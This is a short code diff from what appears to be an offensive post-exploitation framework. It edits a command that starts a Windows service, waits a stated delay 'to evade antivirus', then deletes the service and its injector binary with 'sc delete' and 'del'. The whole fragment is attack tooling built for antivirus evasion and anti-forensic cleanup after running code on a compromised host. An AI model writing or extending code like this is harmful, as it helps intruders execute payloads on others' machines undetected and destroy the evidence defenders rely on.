@@ -110,18 +110,17 @@ namespace Commander.Commands.Composite
             this.Echo($"[>] Starting service...");
             this.Shell($"sc start {context.Options.service}");
            
-            if(context.Options.inject)
-            {
-
-            }
             if (!context.Options.inject)
             {
-                this.Echo($"[!] Don't forget to remove service after use! : shell sc delete {context.Options.service}");
+                this.Echo($"[>] Removing service...");
+                this.Shell($"sc delete {context.Options.service}");
+                this.Echo($"[!] Don't forget to remove service binary after use! : shell del {path}");
             }
             else
             {
-                this.Echo($"[>] Waiting {options.InjectionDelay}s to evade antivirus...");
+                this.Echo($"[>] Waiting {options.InjectionDelay + 10}s to evade antivirus...");
                 this.Delay(options.InjectionDelay + 10);
+                this.Echo($"[>] Removing service...");
                 this.Shell($"sc delete {context.Options.service}");
                 this.Echo($"[>] Removing injector {path}...");
                 this.Shell($"del {path}");
